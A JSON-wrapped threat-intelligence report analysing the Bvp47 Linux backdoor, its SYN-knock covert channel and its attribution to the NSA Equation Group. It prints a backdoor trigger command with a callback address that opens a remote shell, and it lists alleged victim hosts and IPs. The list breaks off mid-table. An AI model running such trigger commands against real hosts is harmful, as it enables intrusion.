{
    "id": "37966373-8fe4-41d8-87bd-b9ded79266e5",
    "created_at": "2022-10-27T08:36:13.924172Z",
    "updated_at": "2025-03-27T02:15:46.140889Z",
    "deleted_at": null,
    "sha1_hash": "b6a45bf5c338924a200e7c67eef4c3601dce0c9e",
    "title": "",
    "authors": "",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 29630183,
    "plain_text": "## Bvp47\n\n### Top-tier Backdoor of US NSA Equation Group\n\n###### Technical Details\n\n\n-----\n\n# Content Table\n\n\n**1. Executive Summary**\n\n**2. Unseen Backdoor**\n\n**3. Backdoor Overview – Bvp47**\n\nFile Structure\n\nFile Properties\n\nFile Structure\n\nUsage Scenario\n\n**4. Attacker Correlation and Attribution**\n\n“The Shadow Brokers Leaks” Incident Correlation\n\nAsymmetric Algorithm Private Key Match\n\nSamples In-depth Correlation\n\nFull Control Command Line\n\nConnection with Snowden Incident\n\nBvp47—US NSA’ s Top-tier Backdoor\n\n\n1\n\n2\n\n4\n\n4\n\n4\n\n4\n\n6\n\n8\n\n8\n\n9\n\n9\n\n12\n\n13\n\n15\n\n\n**5. Global Victims**\n\nConnection with Snowden Incident\n\nExploit the victim host as a jump server to attack target\n\n**6. Detailed Techniques of Bvp47 Backdoor**\n\nMajor Behaviours\n\nPayload\n\nStrings Encryption\n\nTechniques of Function Name Obfuscation\n\nBvp Engine\n\nSystem Hook\n\nAV Evasion in Kernel Module\n\nBPF Covert Channel\n\nChannel Encryption and Decryption\n\nRuntime Environment Detection\n\nOther Techniques\n\n\n**16**\n\n16\n\n26\n\n**27**\n\n27\n\n28\n\n31\n\n32\n\n33\n\n38\n\n45\n\n45\n\n48\n\n50\n\n51\n\n\n**7. Summary** **52**\n\n**8. References** **53**\n\n\n-----\n\n### 1. Executive Summary\n\nIn a certain month of 2013, during an in-depth forensic investigation of a host in a key domestic department, researchers from the Pangu Lab extracted a set of advanced backdoors on the Linux platform, which\nused advanced covert channel behavior based on TCP SYN packets, code obfuscation, system hiding,\nand self-destruction design. In case of failure to fully decrypt, It is further found that this backdoor needs\nthe check code bound to the host to run normally. Then the researchers cracked the check code and successfully ran the backdoor. Judging from some behavioral functions, this is a top-tier APT backdoor, but\nfurther investigation requires the attacker's asymmetric encrypted private key to activate the remote control function. Based on the most common string \"Bvp\" in the sample and the numerical value 0x47 used in\nthe encryption algorithm, the team named the corresponding malicious code \"Bvp47\" at the time.\n\nIn 2016 and 2017, “The Shadow Brokers” published two batches of hacking files claimed to be used by\n“The Equation Group”. In these hacking files, researchers form Pangu Lab found the private key that can\nbe used to remotely trigger the backdoor Bvp47. Therefor, It can be concluded that Bvp47 is a hacker tool\nbelonging to \" The Equation Group\".\n\nThrough further research, the researchers found that the multiple procedures and attack operation manuals disclosed by \"The Shadow Broker\" are completely consistent with the only identifier used in the NSA\nnetwork attack platform operation manual [References 3 and 4] exposed by CIA analyst Snowden in the\n\"Prism\" incident in 2013.\n\nIn view of the US government's prosecution of Snowden on three charges of \"spreading national defense\ninformation without permission and deliberately spreading confidential information\", it can be determined\nthat the documents published by \"The Shadow Brokers\" are indeed NSA, which can fully prove that ” The\nEquation Group” belongs to NSA, that is, Bvp47 is the top-tier backdoor of NSA. Besides the files of “The\nShadow Brokers” revealed that the scope of victims exceeded 287 targets in 45 countries, including\nRussia, Japan, Spain, Germany, Italy, etc. The attack lasted for over 10 years. Moreover, one victim in\nJapan is used as a jump server for further attack.\n\nPangu Lab has a code named “Operation Telescreen” for several Bvp47 incidents. Telescreen is a device\nimagined by British writer George Orwell in his novel “1984”. It can be used to remotely monitor the person\nor organization deploying the telescreen, and the \"thought police\" can arbitrarily monitor the information\nand behavior of any telescreen.\n\nThe Equation Group is the world's leading cyber-attack group and is generally believed to be affiliated with\nthe National Security Agency of the United States. Judging from the attack tools related to the organization, including Bvp47, Equation group is indeed a first-class hacking group. The tool is well-designed, powerful, and widely adapted. Its network attack capability equipped by 0day vulnerabilities was unstoppable,\nand its data acquisition under covert control was with little effort. The Equation Group is in a dominant position in national-level cyberspace confrontation.\n\n\n-----\n\n### 2. Unseen Backdoor\n\nIn a certain month of 2015, an advanced threat detection system deployed by a customer prompted a special network intrusion alarm, and there were suspicious communication activities between important servers. During the incident response process, packets were captured at several nodes in the network and the\nserver’s information was obtained by disk mirroring. After preliminary analysis, at least two servers in the\nsystem network have been hacked and implanted with backdoors, and there are signs of a relatively large\namount of data leakage\n\nThe investigation of the incident involved 3 servers, one of which was the source of external attacks, host\nA, and the other two internally affected servers, V1 (mail server) and V2 (a business server). There is\nabnormal communication between external host A and the V1 server. Specifically, A first sends a SYN\npacket with a 264-byte payload to port 80 of the V1 server (normal SYN packets generally do not carry a\nPayload), and then the V1 server immediately initiates an external connection to the high-end port of the\nA machine and maintains a large amount of exchange data. Data communication is encrypted.\n\nAt almost the same time, the V1 server connects to the V2 server's SMB service and performs some sensitive operations, including logging in to the V2 server with an administrator account, trying to open terminal\nservices, enumerating directories, and executing Powershell scripts through scheduled tasks.\n\nAt the same time, the V2 server connected to the 8081 port of the V1 server to download suspicious files,\nincluding the Powershell script and the encrypted data of the second stage.\n\nA simple HTTP server implemented in Python was started on port 8081 of the V1 server, and the V2 server\nobtained two files from the above: index.html and index.htm. Among them, index.html is a Base64-encoded Powershell script. After this script is executed on the server, it will continue to download a file named\nindex.htm from the V1 server. The content is Base64-encoded data, but after decoding it is found to be an\nunreadable string. Analysis of the Powershell script executed to download index.htm proves that this is a\npiece of asymmetrically encrypted data.\n\nNext, the V2 server connects to the high-end port of the V1 server to communicate with its own protocol,\nand a large amount of interactive transmission data is encrypted.\n\n\n-----\n\nBased on the above observations, it can be inferred from the above analysis that the V1/V2 servers have\nbeen implanted with backdoors. By integrating the overall interaction of the A machine and the V1/V2\nserver, we can restore the communication process between the machines as follows:\n\n1. Machine A connects to port 80 of the V1 server to send a knock request and start the backdoor program\non the V1 server;\n\n2. The V1 server reversely connects the high-end port of machine A to establish a data pipeline;\n\n3. The V2 server connects to the backdoor web service opened on the V1 server, and obtains PowerShell\nexecution from the V1 server;\n\n4. The V1 server connects to the SMB service port of the V2 server to perform command operations;\n\n5. The V2 server establishes a connection with the V1 server on the high-end port and uses its own encryp\ntion protocol for data exchange;\n\n6. The V1 server synchronizes data interaction with the A machine, and the V1 server acts as a data trans\nfer between the A machine and the V2 server;\n\nThis is a backdoor communication technology that has never been seen before, implying an organization\nwith strong technical capabilities behind it.\n\n\n-----\n\n### 3. Backdoor Overview – Bvp47\n\nAfter some effort, our forensic team successfully extracted the backdoor file on the compromised machine\nand found that the string \"Bvp\" is more common in the sample file and the value 0x47 is used in the encryption algorithm. We will temporarily name the sample file \" Bvp47\".\n\n###### File Structure\n\n File Properties\n\n Filename initserial or others\n\n Hash（MD5） 58b6696496450f254b1423ea018716dc\n\n File Size 299,148 bytes\n\n File Path /usr/bin/modload\n\n Platform Linux\n\n File Structure\n\n ELF\n\n Payload\n\nThe basic file structure of Bvp47 includes two parts: loader and payload. The loader is mainly responsible\nfor the decryption and memory loading of the payload. The payload is compressed and encrypted. The 18\nslices are simply divided into three types T0, T1, T2, named Slice0x00-Slice0x11:\n\n- T0{Slice0x00}\n\n- T1{Slice0x01-Slice0x10}\n\n- T2{Slice0x11}\n\nAfter decompression analysis, the sizes of the 18 slices of Bvp47 are as follows:\n\n|Filename|initserial or others|\n|---|---|\n|Hash（MD5）|58b6696496450f254b1423ea018716dc|\n|File Size|299,148 bytes|\n|File Path|/usr/bin/modload|\n|Platform|Linux|\n\n\n-----\n\nThe 18 slices are sorted according to the amount of Bvp engine API calls used by each slice (for the introduction of Bvp engine, see following chapters) and the amount of export functions, the details are as\nfollows (the red part is modules that need to be focused on):\n\n\nSlice Main Feature Bvp API Call Export Function Comments\n\n\n0x00\n\n0x01\n\n0x02\n\n0x03\n\n0x04\n\n0x05\n\n0x06\n\n0x07\n\n0x08\n\n0x09\n\n0x0A\n\n0x0B\n\n0x0C\n\n0x0D\n\n0x0E\n\n0x0F\n\n0x10\n\n0x11\n\n\nDetect runtime environment\n\nNon-PE module, Bvp offset database\n\nDewdrops\n\nSectionChar_Agent\n\nNon-PE module, Bvp offset database\n\nPATh=. crond\n\n\n0\n\n192\n\n8\n\n9\n\n2\n\n3\n\n10\n\n10\n\n3\n\n8\n\n0\n\n0\n\n0\n\n15\n\n0\n\n17\n\n0\n\n\n190\n\n490\n\n5\n\n14\n\n3\n\n16\n\n152\n\n264\n\n17\n\n3\n\n14\n\n0\n\n0\n\n0\n\n0\n\n94\n\n0\n\n\n1 init function\n\nmodule_main\n\nmodule_main\n\nmodule_main\n\n\n-----\n\n###### Usage Scenario\n\nOur team reproduced the use of the Bvp47 backdoor in our own environment and roughly clarified its\nusage scenarios and basic communication mechanisms. As an important backdoor platform for long-term\ncontrol of victims after a successful invasion, Bvp47 generally lives in the Linux operating system in the\ndemilitarized zone that communicates with the Internet. It mainly assumes the core control bridge communication role in the overall attack, as shown in the following figure:\n\n###### Attacker(SYN Knock)\n\n**Hacker**\n\n###### Internet（e.g. 443port）\n\n GateWay\n Router/Firewall\n TCP\n\n Lateral movement\n\n Internal Server DMZ\n Email server etc.\n\n After analysis, the actual network attack data packet process was restored.\n\n\n-----\n\n###### p p\n\n1. Once the control end (192.168.91.131) sends a TCP protocol SYN packet with a certain length of a\nspecific payload (length is 136 bytes) to the \"victim IP\" (192.168.91.128); 1357 port (the live port can\nbe reused directly);\n\n2. After receiving the special SYN packet, the \"victim IP\" (192.168.91.128) will immediately follow the\ninstructions to connect to port 2468 of the \"control end\";\n\n3. The \"victim IP\" (192.168.91.128) enters the controlled process;\n\nBvp47 exploits one weakness that common network detection devices generally do not check data packets\nduring the TCP handshake. Bvp47 injects data in the first SYN packet in order to avoid detection by\nnetwork security devices.\n\n[Step 1]  The payload data in the mentioned SYN packet is as follows:\n\n[Step 3] The content of the packet sent by the victim IP after the successful TCP handshake is as follows:\n\nIn the analysis later in this article, Bvp47 builds its covert communication system from cryptography,\nnetwork, and Linux OS. Such covert communication system is cutting edge and can be seen as an advanced\nversion of \"SYNKnock\" (old version of Cisco devices only conduct simple verification).\n\n\n-----\n\n#### 4. Attacker Correlation and Attribution\n\n###### “The Shadow Brokers Leaks” Incident Correlation\n\nIn 2016, a hacker group named Shadow Broker released two compressed files, eqgrp-free-file.tar.xz.gpg\nand eqgrp-auction-file.tar.xz.gpg, claiming to have compromised the United States NSA's Equation group.\nThe compressed file contains a large number of hacking tools of Equation group. Among them, the\neqgrp-free-file.tar.xz.gpg compressed file is available for public download for inspection, and the other is\nsold at a current price of 1 million bitcoins for the decompression password of the eqgrp-auction-file.tar.xz.gpg file. However, no one would buy it. Finally, Shadow Broker chose to publish the decompression password of eqgrp-auction-file.tar.xz.gpg in April 2017.\n\nIn the process of analyzing the eqgrp-auction-file.tar.xz.gpg file, it was found that Bvp47 and the attacking\ntools in the compressed package were technically deterministic, mainly including “dewdrops”, “solutionchar_agents”, “tipoffs”, “StoicSurgeon”, “insision” and other directories. The “dewdrops_tipoffs” contains\nthe private key required by Bvp47 for RSA public-private key communication. On this basis, it can be confirmed that Bvp47 is from Equation group.\n\nAmong them, “dewdrops” and “solutionchar_agents” are integrated into the Bvp47 sample platform as\ncomponent functions, and the “tipoffs” directory is the control end of the Bvp47 remote communication.\n\n\n-----\n\n###### Asymmetric Algorithm Private Key Match\n\nThe “tipoffs” directory contains the RSA asymmetric algorithm private key used in the Bvp47 covert channel. That RSA private key is vital to Bvp47's command execution and other operations.\n\n###### Samples In-depth Correlation\n\nThe user.tool.stoicsurgeon.COMMON file in the eqgrp-auction-file.tar.xz.gpg file\\Linux\\doc\\old\\etc\\ directory describes how to use the tipoff-BIN tool, and also reveals a series of Information:\n\n1. Bvp47 contains the module named \"dewdrop\", which can be triggered by the RSA private key of moudle\n\"tipoff\";\n\n2. File COMMON descript a backdor named \"StoicSurgeon\", namely a stoic surgeon, a multi-platform\nadvanced rootkit backdoor, which can be combined use with \"dewdrop\";\n\n3. \"StoicSurgeon\" also has a little brother, \"Incision\", which is an incision and a rootkit backdoor;\n\n4. During invasion, \"Incision\" can be upgraded to \"StoicSurgeon\";\n\n\n-----\n\nThe operating system supported by dewdrop basically covers mainstream Linux distributions, JunOS,\nFreeBSD, Solaris, etc.\n\nThe operating system supported by StoicSurgeon basically covers mainstream Linux distributions,JUNOS,FreeBSD,Solaris,etc.\n\n\n-----\n\nHow to upgrade from Incision to Stoicsurgeon is provided in the file \"user.tool.linux.remove_install_ss.COMMON\".\n\n\n-----\n\n###### Full Control Command Line\n\nBounce back connection operation of Bvp47 backdoor can be done by following command:\n\n\n###### #./tipoffs/dewdrop_tipoff --trigger-address 11.22.33.44 --target-address\n\n 12.34.56.78 --target-protocol tcp --target-port 1357 --callback-address 13.24.57.68\n\n --callback-port 2468 --start-ish\n\n\nAmong them, ish corresponds to the file ish in the \\eqgrp-auction-file\\Linux\\bin directory, combined with\nthe leaked ish tool, successfully activated the backdoor Bvp47, completed the remote download execution\nfunction, and opened the remote shell.\n\n\n-----\n\n###### Connection with Snowden Incident\n\nIn December 2013, the German media \"Der Spiegel\" published an NSA ANT catalog with 50 pictures. This\nis a series of top-secret materials compiled by the NSA in 2008-2009, including the use of a series of\nadvanced hacking tools. The source of information may come from Edward Snowden or another unknown\nintelligence provider [Reference 3].\n\nThe FOXACID-Server-SOP-Redacted.pdf file in the NSA ANT catalog [Reference 4], that is, the \"Acid Fox\"\nProject-Server Standard Operating Procedure Revision, NSA Vulnerability Attack Operating Platform\nFunctional Description and User Manual, in this standard work. The document describes the mandatory\nunique identification code required for the job, \"ace02468bdf13579\".\n\n\n-----\n\n\\eqgrp-free-file\\Firewall\\BANANAGLEE\\BG3000\\Install\\LP\\Modules\\PIX\\ directory， also has a unique\nidentification code of \"ace02468bdf13579\", and the file name “SecondDate” conforms to the standard of\noperation document.\n\nIf SecondDate-3021.exe is just a coincidence, string \"ace02468bdf13579\" appears in the 47 files related\nto the tool named SecondDate in the leaked tool set, which is obviously not a coincidence that can be\nexplained.\n\nAnd in a SecondDate file named \\eqgrp-free-file\\Firewall\\SCRIPTS\\ directory, it describes how to use\nSecenData, which is consistent with the description of FOXACID-Server-SOP-Redacted.pdf mentioned\nearlier.\n\n\n-----\n\nspans multiple platforms and architectures, such as Windows, Linux, Solaris, etc. The types from executable files to shellcode are very comprehensive, and it has undergone multiple iterations of the lowest\nversion. 1.3.0.1 was created in May 2007, and the highest version 3.0.3.6 was created in October 2013.\nThe starting time was in line with the top-secret electronic monitoring plan implemented in 2007 as\ndescribed by the PRISM Project (PRISM), and it lasted as long as 6 years. The iterative version, perfect\ncross-platform, support for various architectures, and diversified startup methods imply the strong organizational and technical capabilities behind the project.\n\nMoreover, the relationship between STOICSURGEON and the SECONDDATE program is also clarified in\nthe opscript.txt in the \"EquationGroup-master\\Linux\\etc\" directory:\n\nTherefore, there are enough reasons to believe that the two compressed files leaked by Shadow Brokers\nin 2016 and 2017 belonged to the NSA Equation group’s hacking tools.\n\n###### Bvp47—US NSA’s Top-tier Backdoor\n\n1. The unique feature identifier \"ace02468bdf13579\" in the hacker tool mentioned in the material of the\nNSA ANT catalog FOXACID-Server-SOP-Redacted.pdf has appeared in the tool set of \"The Shadow\nBrokers Leaks\" many times;\n\n2. The RSA private key in the Bvp47 backdoor program exists in the tool tipoff-BIN of \"The Shadow Brokers\nLeaks\";\n\n3. Use the tool tipoff-BIN of \"The Shadow Brokers Leaks\" to directly activate the moule Dewdrops of the\nbackdoor Bvp47, and Dewdrop and STOICSURGEON were belong to the same series backdoor ;\n\n4. It is finally determined that the Bvp47 backdoor is assembled by the \"The Shadow Brokers Leaks\" tool\nmodule, that is, Bvp47 belongs to the top backdoor of the Equation group of US NSA;\n\n\n-----\n\n#### 5. Global Victims\n\n###### The victims in 2017 Shadow Brokers leak\n\nA list of potential Dewdrop, StoicSurgeon and Incision backdoor victims is provided in the\neqgrp-auction-file.tar.xz.gpg file\\Linux\\bin\\varkeys\\pitchimpair\\ directory. The victims are all over the\nworld, including some key units of China:\n\n|Domain name sonatns.sonatrach.dz enterprise.telesat.com.co voyager1.telesat.com.co metcoc5cm.clarent.com iti-idsc.net.eg mbox.com.eg pksweb.austria.eu.net opserver01.iti.net.pk sussi.cressoft.com.pk ns1.multi.net.pk mpkhi-bk.multi.net.pk tx.micro.net.pk|IP 193.194.75.35 66.128.32.67 66.128.32.68 213.132.50.10 163.121.12.2 213.212.208.10 193.154.165.79 202.125.138.184 202.125.140.194 202.141.224.34 202.141.224.40 203.135.2.194|Country Algeria Argentina Argentina Argentina Egypt Egypt Austria Pakistan Pakistan Pakistan Pakistan Pakistan|Details Algeria North America North America United Arab Emirates DU Telecom Egypt Egypt Austria Pakistan Pakistan Pakistan Pakistan Pakistan|\n|---|---|---|---|\n\n\n-----\n\n|pop.net21pk.com connection1.connection.com.br connection2.connection.com.br vnet3.vub.ac.be debby.vub.ac.be theta.uoks.uj.edu.pl rabbit.uj.edu.pl okapi.ict.pwr.wroc.pl ids2.int.ids.pl most.cob.net.ba webnetra.entelnet.bo ns1.btc.bw mailhost.fh-muenchen.de sunbath.rrze.uni--erlangen.de niveau.math.uni-bremen.de s03.informatik.uni-bremin.de kalliope.rz.unibw--muenchen.de kommsrv.rz.unibw-muenchen.de servercip92.e-technik.uni-rostock.de paula.e-technik.uni-rostock.de pastow.e-technik.uni-rostock.de xilinx.e-technik.uni-rostock.de asic.e-technik.uni-rostock.de jupiter.mni.fh.giessen.de saturn.mni.fh-giessen.de n02.unternehmen.com no1.unternehemen.com no3.unternehmen.org unk.vver.kiae.rr sunhe.jinr.ru mail.ioc.ac.ru www.nursat.kz kserv.krldysh.ru ns2.rosprint.ru gate.technopolis.kirov.ru jur.unn.ac.ru|203.135.45.66 200.160.208.4 200.160.208.8 134.184.15.13 134.184.15.79 149.156.89.30 149.156.89.33 156.17.42.30 195.117.3.32 195.222.48.5 166.114.10.28 168.167.168.34 129.187.244.204 131.188.3.200 134.102.124.201 134.102.201.53 137.193.10.12 137.193.10.8 139.30.200.132 139.30.200.225 139.30.200.36 139.30.202.12 139.30.202.8 212.201.7.17 212.201.7.21 62.116.144.147 62.116.144.150 62.116.144.190 144.206.175.2 159.93.18.100 193.233.3.6 194.226.128.26 194.226.57.53 194.84.23.125 217.9.148.61 62.76.114.22|Pakistan Brazil Brazil Belgium Belgium Poland Poland Poland Poland Bosnia Bolivia Botswana Germany Germany Germany Germany Germany Germany Germany Germany Germany Germany Germany Germany Germany Germany Germany Germany The Russian Federation The Russian Federation The Russian Federation The Russian Federation The Russian Federation The Russian Federation The Russian Federation The Russian Federation|Pakistan Brazil Sao Paulo Brazil Sao Paulo Free University of Brussels, Belgium Free University of Brussels, Belgium Poland academic centre in Southern Poland Poland academic centre in Southern Poland Poland Education Network Poland Bosnia and Herzegovina Bolivia Botswana eibniz Rechenzentrum, Munich, Bavaria, Germany University of Erlangen-Nuremberg, Germany University of Bremen, Germany University of Bremen, Germany Bundeswehr University Munich, Germany Bundeswehr University Munich, Germany Germany Germany Germany Germany Germany Giessen-Friedberg University of Applied Sciences, Germany Giessen-Friedberg University of Applied Sciences, Germany InterNetX, Munich, Bavaria, Germany InterNetX, Munich, Bavaria, Germany InterNetX, Munich, Bavaria, Germany Kurchatov Institute of Atomic Energy, Russia Dubna University, Russia Russia Russia Russia Russia Russia Russia|\n|---|---|---|---|\n\n\n-----\n\n|ns1.bttc.ru spirit.das2.ru m0-s.san.ru tayuman.info.com.ph ns2-backup.tpo.fi mail.tpo.fi ns.youngdong.ac.kr ns1.youngdong.ac.kr ns.kix.ne.kr ns.khmc.or.kr ns.hanseo.ac.kr mail.hanseo.ac.kr sky.kies.co.kr smuc.smuc.ac.kr ns.anseo.dankook.ac.kr myhome.elim.net ns.kimm.re.kr mail.howon.ac.kr ns.hufs.ac.kr san.hufs.ac.kr ns.icu.ac.kr winner.hallym.ac.kr ns.hallym.ac.kr winners.yonsei.ac.kr e3000.hallym.ac.kr win.hallym.ac.kr mail.hallym.ac.kr dcproxy1.thrunet.com mail.mae.co.kr ns2.ans.co.kr ns.eyes.co.kr ftp.hyunwoo.co.kr jumi.hyunwoo.co.kr mail.utc21.co.kr doors.co.kr orange.npix.net|80.82.162.118 81.94.47.83 88.147.128.28 203.172.11.21 193.185.60.40 193.185.60.42 202.30.58.1 202.30.58.5 202.30.94.10 203.231.128.1 203.234.72.1 203.234.72.4 203.236.114.1 203.237.176.1 203.237.216.2 203.239.130.7 203.241.84.10 203.246.64.14 203.253.64.1 203.253.64.2 210.107.128.31 210.115.225.10 210.115.225.11 210.115.225.14 210.115.225.16 210.115.225.17 210.115.225.25 210.117.65.44 210.118.179.1 210.126.104.74 210.98.224.88 211.232.97.195 211.232.97.217 211.40.103.194 211.43.193.9 211.43.194.48|The Russian Federation The Russian Federation The Russian Federation Philippine Finland Finland South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea|Russia Russia Russia Philippine Finland Finland South Korea South Korea South Korea National Infomation Society Agency South Korea KYUNG-HEE UNIVERSITY South Korea KT Telecom South Korea KT Telecom South Korea South Korea Education Network South Korea Education Network South Korea South Korea KOREA INSTITUTE OF MACHINERY & MATERIALS South Korea Education Network South Korea Hankuk University of Foreign Studies South Korea Hankuk University of Foreign Studies Sejong University, South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea South Korea Cheongju, South Korea South Korea South Korea South Korea South Korea LG DACOM South Korea South Korea|\n|---|---|---|---|\n\n\n-----\n\n|seoildsp.co.kr logos.uba.uva.nl opcwdns.opcw.nl nl37.yourname.nl ns.gabontelecom.com itellin1.eafix.net ns1.starnets.ro ns2.chem.tohoku.ac.jp ns.global-one.dk eol1.egyptonline.com rayo.pereira.multi.net.co mn.mn.co.cu smtp.bangla.net ns1.bangla.net mail.bangla.net dns2.unam.mx dns1.unam.mx ns.unam.mx sedesol.sedesol.gob.mx www.pue.uia.mx docs.ccs.net.mx info.ccs.net.mx segob.gob.mx mercurio.rtn.net.mx mercurio.rtn.net.mx ciidet.rtn.net.mx tuapewa.polytechnic.edu.na sunfirev250.cancilleria.gob.ni ccmman.rz.unibw--muenchen.de unknown.unknown www21.counsellor.gov.cn mbi3.kuicr.kyoto-u.ac.jp cs-serv02.meiji.ac.jp icrsun.kuicr.kyoto-u.ac.jp icrsun.kuicr.kyoto-u.ac.jp sunl.scl.kyoto-u.ac.jp|218.36.28.250 145.18.84.96 195.193.177.150 82.192.68.37 217.77.71.52 212.49.95.133 193.226.61.68 130.134.115.132 194.234.33.5 206.48.31.2 206.49.164.2 216.72.24.114 203.188.252.10 203.188.252.2 203.188.252.3 132.248.10.2 132.248.204.1 132.248.253.1 148.233.6.164 192.100.196.7 200.36.53.150 200.36.53.160 200.38.166.2 204.153.24.1 204.153.24.14 204.153.24.32 196.31.225.2 165.98.181.5 137.93.10.6 125.10.31.145 130.34.115.132 133.103.101.21 133.26.135.224 133.3.5.2 133.3.5.20 133.3.5.30|South Korea Netherlands Netherlands Netherlands Gabon Kenya Romania USA USA USA USA USA Bangladesh Bangladesh Bangladesh Mexico Mexico Mexico Mexico Mexico Mexico Mexico Mexico Mexico Mexico Mexico South Africa Nicaragua Norway Japan Japan Japan Japan Japan Japan Japan|South Korea Netherlands Netherlands LeaseWeb IDC, Amsterdam, The Netherlands Gabon Kenya Romania USA Denmark USA USA USA Bangladesh Bangladesh Bangladesh National Autonomous University of Mexico National Autonomous University of Mexico National Autonomous University of Mexico Mexico Mexico Mexico Mexico Mexico Mexico Mexico Mexico Namibia National Engineering University of Nicaragua Norway Japan ATHOME Network Tohoku University Japan Meiji University, Japan Kyoto University, Japan Kyoto University, Japan Kyoto University, Japan|\n|---|---|---|---|\n\n\n-----\n\n|uji.kyoyo-u.ac.jp ci970000.sut.ac.jp ns.bur.hiroshima-u.ac.jp fl.sun-ip.or.jp son-goki.sun-ip.or.jp nodep.sun-ip.or.jp hk.sun-ip.or.jp ns1.sun-ip.or.jp proxy1.tcn.ed.jp photon.sci-museum.kita.osaka.jp noc35.corp.home.ad.jp noc37.corp.home.ad.jp noc38.corp.home.ad.jp noc33.corp.home.ad.jp noc21.corp.home.ad.jp noc23.corp.home.ad.jp noc25.corp.home.ad.jp noc26.corp.home.ad.jp www2.din.or.jp www3.din.or.jp mail-gw.jbic.go.jp mail.interq.or.jp www.cfd.or.jp hakuba.janis.or.jp mx1.freemail.ne.jp pitepalt.stacken.kth.se snacks.stacken.kth.se ns.stacken.kth.se milko.stacken.kth.se xn--selma-lagerlf-tmb.stacken.kth.se xn--anna-ahlstrm-fjb.stacken.kth.se www.bygden.nu geosun1.unige.ch scsun25.unige.ch cmusun8.unige.ch dns2.net1.it|133.3.5.33 133.31.106.46 133.41.145.11 150.27.1.10 150.27.1.11 150.27.1.2 150.27.1.5 150.27.1.8 202.231.176.242 202.243.222.7 203.165.5.114 203.165.5.117 203.165.5.118 203.165.5.74 203.165.5.78 203.165.5.80 203.165.5.82 203.165.5.83 210.135.90.7 210.135.90.8 210.155.61.54 210.157.0.87 210.198.16.75 210.232.42.3 210.235.164.21 130.237.234.151 130.237.234.152 130.237.234.17 130.237.234.3 130.237.234.51 130.237.234.53 192.176.10.178 129.194.41.4 129.194.49.47 129.194.97.8 213.140.195.7|Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan Sweden Sweden Sweden Sweden Sweden Sweden Sweden Switzerland Switzerland Switzerland Cyprus|Kyoto University, Japan Tokyo University of Science Japan Japan Japan Japan Japan Japan Japan SINET Tokyo Velix Technology Co., Ltd. Japan Japan Japan Japan Japan Japan Japan Japan Japan Japan KDDI Communications Company, Tokyo, Japan Japan GMO Japan Japan KDDI Japan KDDI Sweden Sweden Sweden Sweden Sweden Sweden Sweden University of Geneva, Switzerland University of Geneva, Switzerland University of Geneva, Switzerland Cyprus|\n|---|---|---|---|\n\n\n-----\n\n|sparc.nour.net.sa mail.imamu.edu.sa kacstserv.kacst.edu.sa mail.jccs.com.sa sci.s-t.au.ac.th webmail.s-t.au.ac.th mail.howon.ac.kr nsce1.ji-net.com war.rkts.com.tr orion.platino.gov.ve ltv.com.ve msgstore2.pldtprv.net splash-atm.upc.es servidor2.upc.es dukas.upc.es moneo.upc.es sun.bq.ub.es oiz.sarenet.es anie.sarenet.es orhi.sarenet.es iconoce1.sarenet.es tologorri.grupocorreo.es zanburu.grupocorreo.es ganeran.sarenet.es colpisaweb.sarenet.es burgoa.sarenet.es mtrader2.grupocorreo.es mailgw.idom.es ns2.otenet.gr electra.otenet.gr dragon.unideb.hu laleh.itrc.ac.ir. mailhub.minaffet.gov.rw mail.irtemp.na.cnr.it mail.univaq.it|212.12.160.26 212.138.48.8 212.26.44.132 212.70.32.100 168.120.9.1 168.120.9.2 203.146.64.14 203.147.62.229 195.142.144.125 161.196.215.67 200.75.112.26 192.168.120.3 147.83.2.116 147.83.2.3 147.83.2.62 147.83.2.91 161.116.154.1 192.148.167.17 192.148.167.2 192.148.167.5 194.30.0.16 194.30.32.109 194.30.32.113 194.30.32.177 194.30.32.229 194.30.32.242 194.30.32.29 194.30.33.29 195.170.2.1 195.170.2.3 193.6.138.65 80.191.2.2 62.56.174.152 140.164.20.20 192.150.195.10|Saudi Arabia Saudi Arabia Saudi Arabia Saudi Arabia Thailand Thailand Thailand Thailand Turkey Venezuela Venezuela Reserved Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Greece Greece Hungary Iran Israel Italy Italy|Saudi Arabia Nour Communication Co.Ltd-Nournet Saudi Arabia King Abdul Aziz City for Science and Technology Saudi Arabia King Abdul Aziz City for Science and Technology Saudi Arabia Jeraisy For Internet Services Co.Ltd Assumption University of Thailand Assumption University of Thailand Thailand Thailand Turkey Venezuela Venezuela Intranet Polytechnic University of Catalonia, Spain Polytechnic University of Catalonia, Spain Polytechnic University of Catalonia, Spain Polytechnic University of Catalonia, Spain University of Barcelona, Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Greece Greece Hungary Iran UK Italian National Research Council Italy|\n|---|---|---|---|\n\n\nsparc.nour.net.sa 212.12.160.26 Saudi Arabia Saudi Arabia Nour Communication\n\nCo.Ltd-Nournet\n\n\nSaudi Arabia King Abdul Aziz City for\n\nkacstserv.kacst.edu.sa 212.26.44.132 Saudi Arabia\n\nScience and Technology\n\n\n-----\n\n|ns.univaq.it matematica.univaq.it sparc20mc.ing.unirc.it giada.ing.unirc.it mailer.ing.unirc.it mailer.ing.unirc.it bambero1.cs.tin.it gambero3.cs..tin.it mail.bhu.ac.in mtccsun.imtech.ernet.in axil.eureka.lk mu-me01-ns-ctm001.vsnl.net.in vsn1radius1.vsn1.net.in vsnl-navis.emc-sec.vsnl.net.in ns1.ias.ac.in mail.tropmet.res.in mail1.imtech.res.in nd11mx1-a-fixed.sancharnet.in ndl1pp1-a-fixed.sancharnet.in bgl1dr1-a-fixed.sancharnet.in bgl1pp1-a-fixed.sancharnet.in mum1mr1-a-fixed.sancharnet.in www.caramail.com newin.int.rtbf.be m16.kazibao.net webshared-admin.colt.net webshared-front2.colt.net webshared-front3.colt.net webshared-front4.colt.net petra.nic.gov.jo ns.cec.uchile.cl|192.150.195.20 192.150.195.38 192.167.50.12 192.167.50.14 192.167.50.2 192.167.50.202 194.243.154.57 194.243.154.62 202.141.107.15 202.141.121.198 202.21.32.1 202.54.4.39 202.54.4.61 